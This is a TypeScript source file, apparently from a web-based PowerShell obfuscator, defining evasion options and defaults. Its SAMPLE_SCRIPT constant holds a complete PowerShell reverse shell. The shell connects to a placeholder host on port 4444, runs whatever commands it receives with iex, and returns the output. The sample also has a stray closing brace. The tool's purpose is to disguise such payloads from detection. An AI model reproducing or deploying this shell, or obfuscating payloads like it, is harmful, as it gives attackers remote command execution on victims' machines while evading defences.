export interface ObfuscationState {
  oneLiner: boolean;
  removeCommentsFlag: boolean;
  addCommentsFlag: boolean;
  randomizeCaseFlag: boolean;
  addQuoteFlag: boolean;
  addValidateFlag: boolean;
  replaceBooleansFlag: boolean;
  replacePwdFlag: boolean;
  renameVarsFlag: boolean;
  iterLength: number;
  iterChar: string;
  customCommentText: string;
  commentCount: number;
}

export const DEFAULT_OPTIONS: ObfuscationState = {
  oneLiner: false,
  removeCommentsFlag: false,
  addCommentsFlag: false,
  randomizeCaseFlag: false,
  addQuoteFlag: false,
  addValidateFlag: false,
  replaceBooleansFlag: false,
  replacePwdFlag: false,
  renameVarsFlag: false,
  iterLength: 20,
  iterChar: "f",
  customCommentText: "",
  commentCount: 10,
};

export const SAMPLE_SCRIPT = `# Sample PowerShell payload
$c = New-Object System.Net.Sockets.TCPClient('<IP>', 4444)
$s = $c.GetStream()
[byte[]]$b = 0..65535|%{0}
while(($i = $s.Read($b, 0, $b.Length)) -ne 0){
    $d = (New-Object System.Text.ASCIIEncoding).GetString($b, 0, $i)
    $r = (iex $d 2>&1 | Out-String)
    $t = $r + 'PS ' + (pwd).Path + '> '
    $m = ([text.encoding]::ASCII).GetBytes($t)
    $s.Write($m, 0, $m.Length)
    $s.Flush()
}
$c.Close()
}
`;

export const PIXEL_FONT = { fontFamily: "'Press Start 2P', monospace" } as const;
